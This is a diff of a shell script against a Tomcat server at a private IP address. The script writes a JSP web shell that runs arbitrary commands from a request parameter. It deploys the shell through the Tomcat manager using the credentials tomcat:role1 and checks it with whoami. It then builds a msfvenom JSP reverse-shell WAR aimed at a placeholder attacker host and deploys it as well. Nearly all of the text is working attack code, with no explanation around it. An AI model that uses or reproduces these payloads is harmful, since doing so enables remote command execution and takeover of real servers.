@@ -1,13 +1,29 @@
-mkdir -p testwar/WEB-INF
-cat > testwar/index.jsp <<'EOF'
-<%= "hello" %>
+cat > shell.jsp << 'EOF'
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if (cmd != null) {
+    Process p = Runtime.getRuntime().exec(cmd);
+    OutputStream os = p.getOutputStream();
+    InputStream in = p.getInputStream();
+    DataInputStream dis = new DataInputStream(in);
+    String disr = dis.readLine();
+    while (disr != null) {
+        out.println(disr);
+        disr = dis.readLine();
+    }
+}
+%>
 EOF
-cd testwar && zip -r ../test.war . && cd ..
-curl -T test.war "http://172.17.17.118:8080/shell"
-curl -T test.war "http://172.17.17.118:8080/shell/"
-curl -X PUT --data-binary @test.war "http://172.17.17.118:8080/shell"
-curl -X PUT --data-binary @test.war "http://172.17.17.118:8080/shell/"
-curl -i http://172.17.17.118:8080/shell/
-curl -i http://172.17.17.118:8080/shell/index.jsp
-curl -X PUT --data-binary @test.war "http://172.17.17.118:8080/shell/test.war"
-curl -X PUT --data-binary @test.war "http://172.17.17.118:8080/shell.war"
+
+mkdir -p WEB-INF
+jar -cvf shell.war shell.jsp WEB-INF
+
+curl -u 'tomcat:role1' \
+   --upload-file shell.war \
+   "http://172.17.17.118:8080/manager/html/deploy?path=/shell&update=true"
+
+curl "http://172.17.17.118:8080/shell/shell.jsp?cmd=whoami"
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f war > shell.war
+curl -u 'tomcat:role1' --upload-file shell.war "http://172.17.17.118:8080/manager/html/deploy?path=/shell"
